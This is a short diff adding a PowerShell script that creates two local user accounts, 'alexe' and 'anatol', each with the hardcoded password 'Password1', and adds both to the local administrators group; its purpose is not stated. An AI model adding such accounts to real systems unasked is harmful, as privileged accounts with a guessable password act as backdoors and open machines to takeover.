@@ -1,0 +1,5 @@
+$list = @("alexe", "anatol")
+foreach ($name in $list){
+    net user $name Password1 /add
+    net localgroup administrators $name /add
+}
